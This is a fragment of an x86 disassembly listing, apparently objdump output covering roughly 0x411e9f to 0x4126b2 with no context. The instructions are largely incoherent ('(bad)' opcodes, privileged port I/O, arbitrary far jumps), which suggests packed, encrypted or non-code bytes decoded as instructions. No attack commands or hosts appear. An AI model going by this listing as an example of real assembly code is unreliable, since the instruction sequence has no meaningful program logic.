  411e9f:	clc    
  411ea0:	or     DWORD PTR [ebx],0x6b
  411ea3:	pop    edi
  411ea4:	(bad)  
  411ea5:	arpl   WORD PTR [edi-0x80],bp
  411ea8:	ins    BYTE PTR es:[edi],dx
  411ea9:	rep outs dx,DWORD PTR ds:[esi]
  411eab:	inc    ebp
  411eac:	and    dl,bl
  411eae:	cwde   
  411eaf:	lock (bad) 
  411eb1:	mov    dl,0x9f
  411eb3:	sub    eax,0xe8d7f38e
  411eb8:	fbstp  TBYTE PTR [ebx]
  411eba:	pop    edx
  411ebb:	pop    ebp
  411ebc:	jnp    0x411eea
  411ebe:	stos   BYTE PTR es:[edi],al
  411ebf:	sbb    BYTE PTR [esi],dl
  411ec1:	pop    esp
  411ec2:	add    esp,DWORD PTR [ebx]
  411ec4:	js     0x411efe
  411ec6:	mov    ds:0x58d9775f,eax
  411ecb:	pop    ebx
  411ecc:	cmp    bl,BYTE PTR [edi-0x58672307]
  411ed2:	popf   
  411ed3:	cld    
  411ed4:	jmp    0x4d943129
  411ed9:	stos   DWORD PTR es:[edi],eax
  411eda:	scas   al,BYTE PTR es:[edi]
  411edb:	popf   
  411edc:	sub    ch,dl
  411ede:	pop    es
  411edf:	inc    ebx
  411ee0:	or     al,0x6c
  411ee2:	or     edx,ebp
  411ee4:	aas    
  411ee5:	sbb    dl,cl
  411ee7:	fwait
  411ee8:	inc    edx
  411ee9:	loopne 0x411f62
  411eeb:	add    eax,0x704d84d
  411ef0:	pop    si
  411ef2:	sti    
  411ef3:	stc    
  411ef4:	ins    DWORD PTR es:[edi],dx
  411ef5:	add    DWORD PTR [ebp+0x2d69dc68],ebp
  411efb:	cmp    eax,0xca377e41
  411f00:	pop    ss
  411f01:	int3   
  411f02:	dec    esp
  411f03:	dec    esp
  411f04:	sub    ch,BYTE PTR [ecx+0x1adcb4e0]
  411f0a:	or     BYTE PTR [edx],0x8d
  411f0d:	xor    esi,DWORD PTR [edi-0x5b]
  411f10:	retf   0x30cc
  411f13:	imul   esp,DWORD PTR [edx+0x56763e6a],0x75
  411f1a:	mov    ds:0x1c5979a,eax
  411f1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f20:	cdq    
  411f21:	mov    dl,0xe9
  411f23:	mov    bh,BYTE PTR ds:0xb9e28581
  411f29:	push   cs
  411f2a:	popf   
  411f2b:	cmp    ch,BYTE PTR [ebp+0x55ce686b]
  411f31:	call   0x67ec:0x4ef0cb60
  411f38:	lea    edi,[esi]
  411f3a:	add    dh,BYTE PTR [edi-0x74]
  411f3d:	rcr    DWORD PTR [edi+0x54c5dd78],0x28
  411f44:	rol    eax,1
  411f46:	jl     0x411eda
  411f48:	mov    dh,0xa5
  411f4a:	push   esi
  411f4b:	in     al,dx
  411f4c:	mov    ebx,0x5e3d5c56
  411f51:	icebp  
  411f52:	mov    dh,0x3c
  411f54:	push   ebp
  411f55:	push   edi
  411f56:	fsub   DWORD PTR [ebx]
  411f58:	inc    esp
  411f59:	out    dx,al
  411f5a:	jmp    0x411f75
  411f5c:	xor    al,0xa1
  411f5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f5f:	rcl    DWORD PTR [ebp-0x45],1
  411f62:	jae    0x411f8b
  411f64:	aaa    
  411f65:	inc    ebx
  411f66:	mov    cl,0x61
  411f68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f69:	cmp    al,dl
  411f6b:	inc    ecx
  411f6c:	pushf  
  411f6d:	shr    DWORD PTR [esi+0x57],cl
  411f70:	adc    DWORD PTR [edx+edx*8-0x439f8f09],ebx
  411f77:	retf   0x2c49
  411f7a:	and    ecx,edx
  411f7c:	add    cl,BYTE PTR [edx]
  411f7e:	jge    0x411f95
  411f80:	push   0x6b
  411f82:	rol    DWORD PTR [ebp+0x67],0x36
  411f86:	ror    BYTE PTR [ecx-0x5e],0xaa
  411f8a:	dec    edi
  411f8b:	lahf   
  411f8c:	push   esp
  411f8d:	sub    esp,DWORD PTR [edi]
  411f8f:	outs   dx,DWORD PTR ds:[esi]
  411f90:	jmp    0x5ded6fe1
  411f95:	xchg   dl,dl
  411f97:	mov    ds:0xce495e48,al
  411f9c:	adc    ebx,DWORD PTR [edi+0x51043e29]
  411fa2:	shl    BYTE PTR [ecx+0xe],cl
  411fa5:	pop    esi
  411fa6:	pop    ecx
  411fa7:	mov    dl,0xc2
  411fa9:	pop    es
  411faa:	arpl   WORD PTR [eax+0x35],bx
  411fad:	out    dx,eax
  411fae:	push   edx
  411faf:	int    0x23
  411fb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fb2:	xchg   ebx,eax
  411fb3:	rcr    DWORD PTR [eax-0x21ad0493],1
  411fb9:	arpl   WORD PTR [ebx+edi*4+0x7e],sp
  411fbd:	jae    0x411f4d
  411fbf:	aaa    
  411fc0:	xor    al,0x84
  411fc2:	call   0x3cf230ea
  411fc7:	mov    al,0x88
  411fc9:	dec    esp
  411fca:	icebp  
  411fcb:	mov    ebx,fs
  411fcd:	ja     0x411f8c
  411fcf:	fsubr  QWORD PTR [ebp-0x67]
  411fd2:	pop    ebp
  411fd3:	rcl    BYTE PTR [edi],cl
  411fd5:	les    edx,FWORD PTR [ebx+0x54155ac3]
  411fdb:	xchg   edx,eax
  411fdc:	jae    0x411fe6
  411fde:	inc    esi
  411fdf:	and    DWORD PTR [edi+ebp*4+0x5d79d0ae],0x8d3ade39
  411fea:	pop    edx
  411feb:	sub    ch,ch
  411fed:	enter  0x8f7a,0x9c
  411ff1:	es dec edi
  411ff3:	jbe    0x412074
  411ff5:	pop    esi
  411ff6:	cwde   
  411ff7:	jns    0x411fa0
  411ff9:	daa    
  411ffa:	add    DWORD PTR [ebp-0xd74453d],ecx
  412000:	fsubr  QWORD PTR [edx+0x14]
  412003:	out    0xa3,eax
  412005:	retf   0xa67e
  412008:	sub    ch,BYTE PTR [esi]
  41200a:	add    al,0xe7
  41200c:	fadd   st(1),st
  41200e:	or     DWORD PTR [edx+0x31130d7b],eax
  412014:	rol    ah,1
  412016:	xchg   esp,eax
  412017:	sub    bl,bh
  412019:	mov    WORD PTR [eax+0x51],gs
  41201c:	xchg   DWORD PTR [eax+0x5f44a688],eax
  412022:	inc    ebp
  412023:	ja     0x412082
  412025:	dec    esp
  412026:	inc    esp
  412027:	mov    dl,0x54
  412029:	stos   BYTE PTR es:[edi],al
  41202a:	sub    eax,0x5867a3ef
  41202f:	(bad)  
  412030:	loope  0x411fc8
  412032:	xor    DWORD PTR [ecx],0xab86f4db
  412038:	adc    cl,ch
  41203a:	mov    bh,0xff
  41203c:	pop    ebp
  41203d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41203e:	inc    edi
  41203f:	mov    ebp,0xd8c0f58d
  412044:	xor    edx,DWORD PTR ds:0xd8603975
  41204a:	shr    dl,1
  41204c:	mov    ebx,0xfb749b69
  412051:	sbb    eax,0xfc228fcd
  412056:	mov    bl,0xdb
  412058:	push   ebx
  412059:	call   0xf265badc
  41205e:	jle    0x412051
  412060:	mov    bh,bl
  412062:	jmp    0xeea10f37
  412067:	fild   WORD PTR [eax+eiz*2+0x4fcee625]
  41206e:	or     esi,DWORD PTR [ebx+esi*2+0xa]
  412072:	shr    DWORD PTR [edi],1
  412074:	push   edx
  412075:	jg     0x4120a0
  412077:	sti    
  412078:	jl     0x412091
  41207a:	adc    eax,0x6bf4e30d
  41207f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412080:	pusha  
  412081:	sbb    BYTE PTR [eax+edx*8],ch
  412084:	lahf   
  412085:	aaa    
  412086:	inc    esi
  412087:	jns    0x4120e9
  412089:	cdq    
  41208a:	mov    ebp,0x1e4ee120
  41208f:	shl    DWORD PTR [esi],1
  412091:	mov    al,ds:0x43a69e0e
  412096:	rcl    BYTE PTR [ebx+0x4593b52e],1
  41209c:	daa    
  41209d:	ja     0x4120ef
  41209f:	(bad)  
  4120a0:	fcmovbe st,st(0)
  4120a2:	xor    ch,BYTE PTR [ebp+0x5b]
  4120a5:	imul   ebp,DWORD PTR ds:0x91f4518e,0x3d
  4120ac:	mov    es,WORD PTR [eax-0x6a6b9e26]
  4120b2:	in     eax,0xf1
  4120b4:	mov    al,0xd0
  4120b6:	lea    edx,[edi-0x30a571b0]
  4120bc:	cli    
  4120bd:	jecxz  0x41208d
  4120bf:	xor    al,0xd8
  4120c1:	push   ds
  4120c2:	stos   BYTE PTR es:[edi],al
  4120c3:	mov    ebx,0x6d0d75b3
  4120c8:	sub    DWORD PTR [ebp+0x79],esi
  4120cb:	sbb    edi,DWORD PTR [ebx+0x2cccb1f7]
  4120d1:	jnp    0x41206b
  4120d3:	dec    ebp
  4120d4:	mov    al,ds:0x16de533
  4120d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120da:	push   ss
  4120db:	int    0x88
  4120dd:	xchg   dh,al
  4120df:	xor    edx,DWORD PTR [esi]
  4120e1:	cmc    
  4120e2:	adc    cl,BYTE PTR [ebx-0x48]
  4120e5:	test   DWORD PTR [edx],0x7664084d
  4120eb:	repz cdq 
  4120ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120ee:	push   edx
  4120ef:	sub    DWORD PTR [ebx+edi*4+0x32],ecx
  4120f3:	and    al,0x75
  4120f5:	jbe    0x412117
  4120f7:	in     eax,dx
  4120f8:	xlat   BYTE PTR ds:[ebx]
  4120f9:	sub    BYTE PTR [ebx-0x12be2ee0],0x2
  412100:	popf   
  412101:	sub    eax,0xf2a9207
  412106:	int3   
  412107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412108:	imul   edi,DWORD PTR [ecx+0x5198babe],0xe
  41210f:	(bad)  
  412110:	ds cmc 
  412112:	imul   ebx,DWORD PTR [esi-0x29ab6a4a],0x22b77573
  41211c:	cmp    eax,0x480aa738
  412121:	fwait
  412122:	xchg   DWORD PTR [ebx+eax*4-0xf],eax
  412126:	fnstcw WORD PTR [edi+0x12257ff6]
  41212c:	test   al,0x29
  41212e:	in     eax,0x2
  412130:	cdq    
  412131:	enter  0xa9ce,0xa6
  412135:	ss jp  0x4120ef
  412138:	sub    ebp,DWORD PTR [eax]
  41213a:	sbb    al,0x8
  41213c:	push   0xffffff84
  41213e:	and    eax,0x4a74fe3d
  412143:	retf   
  412144:	mov    ah,0xb2
  412146:	or     BYTE PTR [ebp-0x62706d73],al
  41214c:	retf   
  41214d:	(bad)  
  41214e:	xchg   edx,eax
  41214f:	shr    BYTE PTR [eax+0x7346e82],1
  412155:	push   eax
  412156:	jg     0x4120ee
  412158:	mov    ebx,esp
  41215a:	shr    DWORD PTR [edx],0xad
  41215d:	cmp    al,bl
  41215f:	inc    esi
  412160:	data16 mov WORD PTR [edx-0x6e],cs
  412164:	adc    DWORD PTR [eax],ebp
  412166:	fisub  DWORD PTR [ebx-0x7f]
  412169:	jnp    0x41211c
  41216b:	mov    esp,0x18d59f00
  412170:	push   ebx
  412171:	fld    QWORD PTR [eax+0x8]
  412174:	int    0xfa
  412176:	ins    BYTE PTR es:[edi],dx
  412177:	lods   eax,DWORD PTR ds:[esi]
  412178:	jge    0x41218e
  41217a:	lods   al,BYTE PTR ds:[esi]
  41217b:	gs hlt 
  41217d:	mov    al,dh
  41217f:	xchg   edi,eax
  412180:	cwde   
  412181:	dec    esi
  412182:	out    0xd9,al
  412184:	test   DWORD PTR [edi+0x4c],0xc5a957ba
  41218b:	test   al,0x26
  41218d:	push   edi
  41218e:	mov    ch,0x2b
  412190:	inc    eax
  412191:	pop    eax
  412192:	and    esp,DWORD PTR [edx]
  412194:	push   cs
  412195:	jmp    0x4121a3
  412197:	movzx  edi,BYTE PTR [ebx]
  41219a:	not    DWORD PTR [edi-0x8]
  41219d:	fwait
  41219e:	int    0xf1
  4121a0:	out    dx,eax
  4121a1:	into   
  4121a2:	jmp    0x1614f81f
  4121a7:	xchg   edi,eax
  4121a8:	repz out 0x22,al
  4121ab:	mov    ds:0x644090,al
  4121b0:	sub    ebx,ecx
  4121b2:	dec    esp
  4121b3:	pop    DWORD PTR [ebx+0x78da562f]
  4121b9:	and    al,0x7a
  4121bb:	inc    esp
  4121bc:	cmc    
  4121bd:	dec    edi
  4121be:	jmp    0x41215f
  4121c0:	cmp    ah,BYTE PTR [ecx*1-0x5d89862a]
  4121c7:	pop    ebp
  4121c8:	sbb    dh,BYTE PTR [esi-0x565145bc]
  4121ce:	xor    BYTE PTR [di],bl
  4121d1:	ss pushf 
  4121d3:	cmp    al,0xa1
  4121d5:	clc    
  4121d6:	jg     0x41217f
  4121d8:	hlt    
  4121d9:	cld    
  4121da:	push   ecx
  4121db:	and    BYTE PTR [eax],cl
  4121dd:	fldenv [edx]
  4121df:	inc    ebx
  4121e0:	xor    al,0x6
  4121e2:	push   0x9fcee6ab
  4121e7:	pop    ebp
  4121e8:	sti    
  4121e9:	ret    0xdc5d
  4121ec:	jb     0x412235
  4121ee:	push   esi
  4121ef:	and    ecx,DWORD PTR [esi-0x72936e6d]
  4121f5:	lahf   
  4121f6:	pop    edx
  4121f7:	cdq    
  4121f8:	stc    
  4121f9:	mov    ch,bl
  4121fb:	enter  0x77ff,0xed
  4121ff:	push   ebp
  412200:	ja     0x412268
  412202:	sbb    DWORD PTR [ecx],ebp
  412204:	pushf  
  412205:	add    ebp,0x58
  412208:	xor    BYTE PTR [edx+0x354c24d2],dl
  41220e:	pop    ds
  41220f:	adc    eax,0x42c2363
  412214:	and    BYTE PTR [ecx],bh
  412216:	or     eax,0xfbf43194
  41221b:	push   eax
  41221c:	or     ecx,edx
  41221e:	(bad)  
  41221f:	std    
  412220:	mov    ?,ebx
  412222:	or     al,dl
  412224:	add    ah,BYTE PTR [esi+0x57]
  412227:	lock repz test BYTE PTR ss:[esi+0x2e],dh
  41222d:	call   0x29ae3b78
  412232:	inc    esp
  412233:	sub    bh,BYTE PTR [edx]
  412235:	daa    
  412236:	or     eax,0xa5975a4d
  41223b:	xlat   BYTE PTR ds:[ebx]
  41223c:	clc    
  41223d:	aaa    
  41223e:	pushf  
  41223f:	(bad)  
  412240:	pop    ecx
  412241:	push   0x7773e1bd
  412246:	pop    ds
  412247:	lea    ebp,[edi+0x4a]
  41224a:	dec    ecx
  41224b:	push   esi
  41224c:	xor    eax,0x5954a5f5
  412251:	cmp    DWORD PTR [ecx-0x3027f3d2],ecx
  412257:	jle    0x412267
  412259:	js     0x412289
  41225b:	jo     0x412212
  41225d:	or     eax,0x18f5240c
  412262:	xor    ah,ah
  412264:	mov    WORD PTR ds:0xc49fee8c,ds
  41226a:	out    dx,eax
  41226b:	scas   eax,DWORD PTR es:[edi]
  41226c:	jl     0x412222
  41226e:	mov    dl,ah
  412270:	sbb    eax,0xadd0d556
  412275:	es in  al,0x41
  412278:	pop    esi
  412279:	or     eax,0x5a29c4e3
  41227e:	jo     0x412230
  412280:	scas   eax,DWORD PTR es:[edi]
  412281:	lods   al,BYTE PTR ds:[esi]
  412282:	inc    esp
  412283:	or     bh,BYTE PTR [ecx+0x7b]
  412286:	mov    al,ds:0xaf508c50
  41228b:	aam    0x7
  41228d:	not    BYTE PTR [ebx+0x7f]
  412290:	(bad)  
  412291:	dec    edi
  412292:	sbb    DWORD PTR [edx-0x43497f6],ebx
  412298:	adc    dl,dh
  41229a:	pusha  
  41229b:	call   0xf9bb448d
  4122a0:	lods   eax,DWORD PTR ds:[esi]
  4122a1:	jmp    0xfa7b:0x44a299ee
  4122a8:	(bad)  
  4122a9:	repz sbb esp,ebx
  4122ac:	call   0xaa3f55df
  4122b1:	xchg   cx,ax
  4122b3:	add    cl,BYTE PTR [ebx]
  4122b5:	test   eax,0x6dc59f11
  4122ba:	shl    dh,1
  4122bc:	in     eax,dx
  4122bd:	and    DWORD PTR [eax-0x2c],0x8aeee97f
  4122c4:	cmp    DWORD PTR [edi-0x3a],esi
  4122c7:	ja     0x412266
  4122c9:	shl    DWORD PTR [esi+edi*2-0x12],0x8d
  4122ce:	data16 cmp al,0xec
  4122d1:	scas   al,BYTE PTR es:[edi]
  4122d2:	popf   
  4122d3:	lock test BYTE PTR [eax-0x54],dl
  4122d7:	fs sahf 
  4122d9:	mov    ah,0x7f
  4122db:	stos   DWORD PTR es:[edi],eax
  4122dc:	jle    0x41230d
  4122de:	mov    eax,ds:0xd1d0d70b
  4122e3:	aam    0x7c
  4122e5:	bound  edi,QWORD PTR [eax+0x27]
  4122e8:	dec    eax
  4122e9:	ficom  DWORD PTR ds:0xfb55bb1f
  4122ef:	adc    esp,edi
  4122f1:	popf   
  4122f2:	fbstp  TBYTE PTR [edx+eiz*2-0x4]
  4122f6:	fsub   QWORD PTR [ebx-0x561f5e0b]
  4122fc:	and    ebx,edi
  4122fe:	or     edi,DWORD PTR ds:0x3ebb2615
  412304:	ror    cl,1
  412306:	push   0x13
  412308:	xlat   BYTE PTR ds:[ebx]
  412309:	fcomip st,st(5)
  41230b:	scas   al,BYTE PTR es:[edi]
  41230c:	shl    DWORD PTR [ebp+0x47e29498],cl
  412312:	push   ecx
  412313:	mov    dl,0x2f
  412315:	aaa    
  412316:	pop    ebx
  412317:	mov    ch,0x30
  412319:	fsub   DWORD PTR [eax]
  41231b:	bound  ebp,QWORD PTR fs:[ecx]
  41231e:	jo     0x4122b0
  412320:	out    0x4,eax
  412322:	jne    0x412361
  412324:	inc    edi
  412325:	inc    ecx
  412326:	pop    edi
  412327:	or     dh,BYTE PTR [esi+eiz*8+0x718a7f89]
  41232e:	(bad)  
  41232f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412330:	dec    ecx
  412331:	sub    ebx,DWORD PTR [ebp-0x45]
  412334:	mov    eax,0x85013ae5
  412339:	add    al,0x37
  41233b:	es jmp 0x4122f4
  41233e:	dec    eax
  41233f:	mov    BYTE PTR [ebx-0x5b],dh
  412342:	push   ecx
  412343:	pop    es
  412344:	push   edi
  412345:	push   ss
  412346:	jnp    0x4122f8
  412348:	push   eax
  412349:	(bad)  
  41234b:	in     eax,dx
  41234c:	cmp    BYTE PTR [edx+0x6c35bc38],dl
  412352:	mov    cs,WORD PTR [esi]
  412354:	ret    
  412355:	call   0x4bc:0xdcba08a1
  41235c:	call   0x7b675f91
  412361:	and    al,0xe0
  412363:	shl    BYTE PTR [edi],0x25
  412366:	popf   
  412367:	aas    
  412368:	enter  0xf412,0xbc
  41236c:	pop    ss
  41236d:	push   ebp
  41236e:	cmc    
  41236f:	inc    esp
  412370:	icebp  
  412371:	mov    ds:0xad00f10c,eax
  412376:	scas   eax,DWORD PTR es:[edi]
  412377:	inc    ecx
  412378:	inc    edx
  412379:	xchg   DWORD PTR ds:0xcb4f4830,esi
  412380:	lahf   
  412381:	sub    BYTE PTR gs:[ecx+ecx*2+0x65],0xa3
  412387:	or     dh,ch
  412389:	fadd   DWORD PTR [ebx-0x431b49ce]
  41238f:	xor    DWORD PTR [ecx],esi
  412391:	inc    ebp
  412392:	jo     0x4123f4
  412394:	jne    0x4123d1
  412396:	mov    ebp,0x5dc14494
  41239b:	aaa    
  41239c:	mov    ebx,0xda286138
  4123a1:	jbe    0x41234b
  4123a3:	icebp  
  4123a4:	add    BYTE PTR [ebx-0x28],dh
  4123a7:	mov    bl,0xe0
  4123a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123aa:	sub    bh,ah
  4123ac:	mov    edi,0x75b08122
  4123b1:	pop    es
  4123b2:	xchg   ecx,eax
  4123b3:	lods   al,BYTE PTR ds:[esi]
  4123b4:	repz (bad) 
  4123b6:	jns    0x4123b1
  4123b8:	mov    dl,BYTE PTR [ebx+0xd]
  4123bb:	call   0xfa7fbfb4
  4123c0:	ja     0x4123c7
  4123c2:	in     eax,dx
  4123c3:	bound  esp,QWORD PTR [ecx+eax*1+0x4f]
  4123c7:	fbld   TBYTE PTR [eax-0x31]
  4123ca:	out    dx,al
  4123cb:	push   ss
  4123cc:	cdq    
  4123cd:	push   ss
  4123ce:	inc    esp
  4123cf:	cmp    WORD PTR [edx-0x4fe4532a],0xd25c
  4123d8:	jl     0x4123d5
  4123da:	imul   esi,DWORD PTR [edi],0x12
  4123dd:	mov    ecx,0xf43099c5
  4123e2:	sub    al,0xac
  4123e4:	loop   0x412372
  4123e6:	stos   BYTE PTR es:[edi],al
  4123e7:	sar    edx,cl
  4123e9:	cwde   
  4123ea:	cmp    eax,0xc9ca2437
  4123ef:	jge    0x4123df
  4123f1:	sub    edx,eax
  4123f3:	xchg   edi,eax
  4123f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123f5:	ins    DWORD PTR es:[edi],dx
  4123f6:	pop    es
  4123f7:	sar    BYTE PTR [edi+0x26388198],0xac
  4123fe:	push   esi
  4123ff:	mov    al,ds:0xe2d0321e
  412404:	cld    
  412405:	sbb    edi,eax
  412407:	sbb    cl,BYTE PTR [edx+0x15]
  41240a:	ror    BYTE PTR [esi],1
  41240c:	adc    al,0x93
  41240e:	ins    DWORD PTR es:[edi],dx
  41240f:	je     0x4123c9
  412411:	and    BYTE PTR [ecx-0xb],cl
  412414:	jmp    0x41244b
  412416:	loop   0x412444
  412418:	aaa    
  412419:	scas   al,BYTE PTR es:[edi]
  41241a:	or     al,0x45
  41241c:	jb     0x4123ad
  41241e:	icebp  
  41241f:	js     0x4123d6
  412421:	or     al,0xb5
  412423:	sbb    DWORD PTR [ebp+edi*1-0x3a4a371d],0x61
  41242b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41242c:	fcmovnb st,st(4)
  41242e:	dec    ebp
  41242f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412430:	or     bh,BYTE PTR [ebx-0x79cf3b6f]
  412436:	aam    0xc9
  412438:	clc    
  412439:	shl    BYTE PTR [eax-0x75ea4ca5],0x71
  412440:	repz jbe 0x412431
  412443:	(bad)
  412447:	xor    ebx,DWORD PTR [eax-0x73]
  41244a:	lods   eax,DWORD PTR ds:[esi]
  41244b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41244c:	mov    bp,0x6efc
  412450:	dec    edi
  412451:	jns    0x412438
  412453:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412454:	scas   al,BYTE PTR es:[edi]
  412455:	call   0xcd0ff864
  41245a:	sub    DWORD PTR [ebx],esi
  41245c:	sbb    al,0x34
  41245e:	std    
  41245f:	and    DWORD PTR [ebx-0xaafa8ba],eax
  412465:	pop    esp
  412466:	push   esi
  412467:	out    0x43,eax
  412469:	(bad)  
  41246b:	outs   dx,DWORD PTR ds:[esi]
  41246c:	and    ebp,DWORD PTR [ebp+eiz*1+0x78]
  412470:	mov    eax,0xf38efa07
  412475:	jo     0x41246d
  412477:	loopne 0x4124f2
  412479:	push   ss
  41247a:	dec    esp
  41247b:	(bad)  
  41247c:	pop    esi
  41247d:	test   al,0xdb
  41247f:	(bad)  
  412482:	sahf   
  412483:	push   edi
  412484:	lahf   
  412485:	jmp    0x412432
  412487:	shl    DWORD PTR [ebp-0x12],1
  41248a:	xor    ch,BYTE PTR [ebp+0x9cb6459]
  412490:	mov    dh,0x3d
  412492:	sub    ebp,DWORD PTR [eax]
  412494:	xchg   ebp,eax
	...
  412511:	add    BYTE PTR [eax],al
  412513:	add    BYTE PTR [eax],bh
  412515:	mov    dl,0xeb
  412517:	sub    bl,0xd9
  41251a:	jnp    0x4124d6
  41251c:	imul   ecx,DWORD PTR [edx],0x6
  41251f:	and    DWORD PTR [ecx],esp
  412521:	inc    ebx
  412522:	xchg   edx,eax
  412523:	sbb    al,0xdf
  412525:	int    0x0
  412527:	add    BYTE PTR [ecx+0x7],ch
  41252a:	add    BYTE PTR [eax],al
  41252c:	(bad)  [esi-0x5b]
  41252f:	imul   esp,DWORD PTR ds:0x8e9ce4d1,0xadf21aa6
  412539:	sbb    edi,DWORD PTR [ebx-0x72]
  41253c:	jb     0x412579
  41253e:	cli    
  41253f:	scas   eax,DWORD PTR es:[edi]
  412540:	mov    ch,0x57
  412542:	mov    ds:0x4db75f73,eax
  412547:	lea    esp,[eax+eax*2+0x4255de55]
  41254e:	aas    
  41254f:	mov    dl,0xf8
  412551:	inc    esi
  412552:	cmp    BYTE PTR ds:0x58abf125,ah
  412558:	jp     0x412575
  41255a:	call   0xa17b:0xc2fc0346
  412561:	pop    ds
  412562:	in     al,dx
  412563:	and    BYTE PTR ds:0xb8b8f295,dl
  412569:	adc    bh,BYTE PTR ds:0x3d2b485a
  41256f:	add    eax,0x5dcfae0
  412574:	cmp    ah,BYTE PTR [ebx+0x5a]
  412577:	cmp    BYTE PTR [edi-0x4612f924],bl
  41257d:	jmp    0x412591
  41257f:	or     al,0x60
  412581:	test   eax,0x1118a19
  412586:	stc    
  412587:	int3   
  412588:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412589:	pop    esi
  41258a:	jp     0x412601
  41258c:	dec    ebp
  41258d:	pop    ecx
  41258e:	int3   
  41258f:	mov    ah,0x25
  412591:	icebp  
  412592:	mov    esi,0x57e3ef22
  412597:	sbb    eax,DWORD PTR [esi+0x27]
  41259a:	inc    edx
  41259b:	push   0x2c
  41259d:	mov    BYTE PTR [ebp-0x208228c9],dl
  4125a3:	mov    ds:0x578d8b26,eax
  4125a8:	cwde   
  4125a9:	adc    DWORD PTR [esi],eax
  4125ab:	pop    esp
  4125ac:	rcl    BYTE PTR [edi+0x35],1
  4125af:	inc    ecx
  4125b0:	(bad)  
  4125b1:	out    dx,eax
  4125b2:	stos   DWORD PTR es:[edi],eax
  4125b3:	out    0xb7,eax
  4125b5:	hlt    
  4125b6:	out    dx,eax
  4125b7:	stos   DWORD PTR es:[edi],eax
  4125b8:	push   cs
  4125b9:	fadd   st(0),st
  4125bb:	sbb    ebp,DWORD PTR [esi]
  4125bd:	sbb    BYTE PTR [esi+0x6e],al
  4125c0:	hlt    
  4125c1:	leave  
  4125c2:	jle    0x41255c
  4125c4:	outs   dx,BYTE PTR ds:[esi]
  4125c5:	hlt    
  4125c6:	imul   ecx,DWORD PTR [ecx-0x6996750a],0x63
  4125cd:	fcmovbe st,st(0)
  4125cf:	aad    0xda
  4125d1:	mov    bh,0xdc
  4125d3:	das    
  4125d4:	mov    dh,0xa6
  4125d6:	or     edx,ebp
  4125d8:	adc    bh,ch
  4125da:	arpl   WORD PTR [ecx+ecx*8-0xa],ax
  4125de:	aam    0xdf
  4125e0:	(bad)  
  4125e1:	fdiv   DWORD PTR [ebp-0x30]
  4125e4:	dec    esi
  4125e5:	clc    
  4125e6:	in     al,0xbd
  4125e8:	es fwait
  4125ea:	lahf   
  4125eb:	and    al,0x3d
  4125ed:	sbb    eax,0xc44094b3
  4125f2:	xor    ch,BYTE PTR [edi]
  4125f4:	aas    
  4125f5:	inc    eax
  4125f6:	fld    QWORD PTR [eax-0x414da1c0]
  4125fc:	cdq    
  4125fd:	sub    DWORD PTR [edi+0x6],esp
  412600:	adc    ebp,DWORD PTR [edx+0x6563576e]
  412606:	daa    
  412607:	repz stc 
  412609:	mov    dh,0x74
  41260b:	div    BYTE PTR [edx]
  41260d:	xchg   ecx,eax
  41260e:	inc    ebx
  41260f:	clc    
  412610:	ins    DWORD PTR es:[edi],dx
  412611:	pop    esp
  412612:	in     al,0xc1
  412614:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412615:	div    BYTE PTR [ecx]
  412617:	mov    eax,ds:0x1ec5011a
  41261c:	fdivr  st,st(6)
  41261e:	or     bl,0x44
  412621:	add    eax,DWORD PTR [ecx+ecx*8]
  412624:	or     edi,eax
  412626:	stos   DWORD PTR es:[edi],eax
  412627:	icebp  
  412628:	mov    ecx,0xc6f565e4
  41262d:	scas   eax,DWORD PTR es:[edi]
  41262e:	(bad)  
  41262f:	and    BYTE PTR gs:[ecx+0x15b9faac],ah
  412636:	out    0x7f,al
  412638:	jmp    0x41262c
  41263a:	dec    ebx
  41263b:	xchg   esp,eax
  41263c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41263d:	out    0xd7,al
  41263f:	push   esi
  412640:	inc    ebp
  412641:	or     eax,0xf67e4f73
  412646:	inc    esp
  412647:	sar    ecx,cl
  412649:	adc    BYTE PTR ds:0x62ef8d69,bl
  41264f:	cmp    eax,0xae1eed05
  412654:	imul   eax,DWORD PTR [esi-0x51],0xe7918e93
  41265b:	push   edx
  41265c:	sbb    DWORD PTR [ecx+0x13],ebp
  41265f:	pop    cx
  412661:	aad    0xbc
  412663:	mov    al,0x58
  412665:	sbb    al,0x30
  412667:	mov    cl,0xdd
  412669:	popf   
  41266a:	dec    edx
  41266b:	out    0x53,eax
  41266d:	je     0x4126e4
  41266f:	push   esi
  412670:	ins    BYTE PTR es:[edi],dx
  412671:	inc    eax
  412672:	cmp    bl,dl
  412674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412675:	xchg   esp,eax
  412676:	mov    ds:0xc794f456,al
  41267b:	adc    eax,0xcb5ff26d
  412680:	xchg   esp,eax
  412681:	or     ch,BYTE PTR [ebp-0x60636e0c]
  412687:	iret   
  412688:	pop    eax
  412689:	jmp    0x47af:0xa8879035
  412690:	mov    bh,0xb6
  412692:	cwde   
  412693:	popf   
  412694:	adc    eax,0x8daaa828
  412699:	push   ecx
  41269a:	in     eax,0xf
  41269c:	pop    ecx
  41269d:	retf   
  41269e:	push   eax
  41269f:	pop    ebp
  4126a0:	sub    al,0xa6
  4126a2:	sub    al,0x53
  4126a4:	out    dx,al
  4126a5:	ins    DWORD PTR es:[edi],dx
  4126a6:	or     dh,BYTE PTR [ebx+0x6f358a33]
  4126ac:	fisubr DWORD PTR [esi-0x18f3e505]
  4126b2:	ja     0x412716
